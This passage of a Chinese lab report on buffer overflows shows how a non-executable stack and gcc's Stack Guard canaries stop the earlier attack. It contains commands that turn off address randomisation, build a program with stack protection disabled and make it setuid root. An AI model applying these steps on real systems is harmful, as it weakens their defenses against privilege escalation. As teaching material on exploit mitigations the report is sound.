+<h4 id="_8">不可执行栈</h4>
+<p>不可执行栈的基本原理是将数据所在的内存页标记为不可执行的，当进程尝试去执行数据页面上的指令时，CPU就会抛出异常，而不是去执行。所以，当开启了不可执行栈选项时，即使我们的恶意代码已经插入到内存，但由于处在数据页面，因此无法执行。</p>
+<p>再次关闭地址空间随机化，gcc编译stack时开启不可执行栈选项</p>
+<pre><code class="language-shell">su root
+sysctl -w kernel.randomize_va_space=0
+gcc -g -fno-stack-protector stack.c -o stack  # gcc默认开启不可执行栈
+chmod 4755 stack
+exit
+</code></pre>
+<p>使用gdb查看<code>str</code>位置时，发现又回到了原来的位置上</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p14.png" alt="p1" style="zoom:120%;" /></p>
+<p>进行攻击，仍然失败</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p15.png" alt="p1" style="zoom:120%;" /></p>
+<h4 id="stack-guard">Stack Guard</h4>
+<p>gcc中的Stack Guard的保护原理时利用 "Canaries" 检测对函数栈的破坏。具体是再缓冲区（如：栈）和控制信息（如 ebp等）间插入一个canary word。这样，当缓冲区溢出时，再返回地址被覆盖之前canary word会首先被覆盖，通过检测canary word的值是否被修改，就可以判断是否发生了溢出。还是以上述的<a href="#c">简单c程序</a>为例</p>
+<p>gcc开启Stack Guard对fun.c进行编译，然后用gdb查看<code>fun</code>函数的汇编</p>
+<pre><code class="language-shell">gcc -g fun.c -o fun  # gcc默认开启Stack Guard
+gdb fun
+disass fun
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p16.png" alt="p1" style="zoom:80%;" /></p>
+<p>和<a href="#fun1">上图</a>最大差别在于函数真正执行前多了以下几条指令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p17.png" alt="p1" style="zoom:80%;" /></p>
+<p>以及退出之前，多了以下几条指令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p18.png" alt="p1" style="zoom:70%;" /></p>
+<p>通过查阅资料可知，gs:0x14里保存的是一个随机数，这个随机数就是canary word。真正执行函数前的指令&lt;+6&gt;到&lt;+15&gt;把这canary word放到ebp-0xc位置上，而函数返回前的&lt;+41&gt;到&lt;+53&gt;指令就是判断canary word是否被修改，如果没被修改则正常返回。由此我们可以大概地画出此时函数栈内的分布如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p19.png" alt="p1" style="zoom:80%;" /></p>
+<p>如果通过之前的方法去修改函数的返回地址，就会修改了canary word的值，就在函数返回前会被检测到。下面是开启了Stack Guard来重复上面的攻击</p>
+<pre><code class="language-shell">su root
+gcc -g -z execstack stack.c -o stack
+chmod 4755 stack
+exit
+./stack
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/wangtl175/images/img/p20.png" alt="p1" style="zoom:80%;" /></p>
+<p>可以看到，栈溢出被检测到并终止了进程。</p>
+<h3 id="_9">结束语</h3>
+<p>通过这次实验，加深了我对操作系统、计算机组成原理、编译器等方面的理解，同时也认识到了缓冲区溢出所带来的危害。为此，我们要养成良好的编程习惯，例如使用安全型函数避免风险。</p>
+<h3 id="_10">参考</h3>
+<p><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-gccstack/?S_TACT=105AGX52&amp;S_CMP=tec-ccid#ibm-pcon">GCC 中的编译器堆栈保护技术</a></p>
+<p><a href="https://www.handsonsecurity.net/files/chapters/buffer_overflow.pdf">SEED BOOKS</a></p>
+
+              
+            </article>
+          </div>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    <nav class="md-footer__inner md-grid" aria-label="页脚">
+      
+        
+        <a href="../../leetcode/2021_03_22_leetcode_valid_number/" class="md-footer__link md-footer__link--prev" aria-label="上一页: 有效数字" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                上一页
+              </span>
+              有效数字
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../2021_06_12_can_a_thread_access_the_stack_of_other_threads/" class="md-footer__link md-footer__link--next" aria-label="下一页: 一个线程能访问另一个线程的栈吗" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                下一页
+              </span>
+              一个线程能访问另一个线程的栈吗
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../..", "features": [], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "search": "../../assets/javascripts/workers/search.361d90f1.min.js"}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.289a2a4b.min.js"></script>
+      
+    
+  </body>
+</html>
